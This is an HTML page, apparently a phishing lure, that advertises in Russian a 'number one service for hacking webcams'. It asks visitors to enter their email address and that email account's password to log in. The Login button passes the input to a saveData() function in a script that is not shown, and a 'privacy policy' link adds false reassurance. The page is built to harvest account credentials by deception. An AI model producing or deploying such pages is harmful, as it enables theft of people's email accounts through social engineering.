<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>hacker.com</title>
    <link rel="stylesheet" href="./index.css" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <nav class="navbar bg-body-tertiary">
      <div class="container-fluid">
        <a class="navbar-brand">
          <img />
          Hacker.com
        </a>
      </div>
    </nav>
  </head>
  <body>
    <h1 class="serviseText">Сервис #1 для взлома веб-камер!</h1>
    <h2 class="loginText">
      Если вы хотите использовать этот сервис для взлома,<br />
      пожалуйста, войдите в систему,<br />
      указав свой адрес электронной почты и пароль от нее ниже.
    </h2>
    <div class="myForm">
      <div class="form-floating mb-3">
        <input
          type="email"
          class="form-control"
          id="floatingInput"
          placeholder="name@example.com"
        />
        <label for="floatingInput">Email adress</label>
      </div>
      <div class="form-floating">
        <input
          type="password"
          class="form-control"
          id="floatingPassword"
          placeholder="Password"
        />
        <label for="floatingPassword">Password</label>
      </div>
    </div>
    <a href="./login.html" target="_blank">
      <div class="myBtn">
        <button type="button" class="btn btn-primary" onclick="saveData()">
          Login
        </button>
      </div>
    </a>
    <p class="politics">
      Мы соблюдаем политику
      <a href="./politics.html" target="_blank">конфиденциальности. </a>
    </p>

    <script src="./index.js"></script>
  </body>
</html>
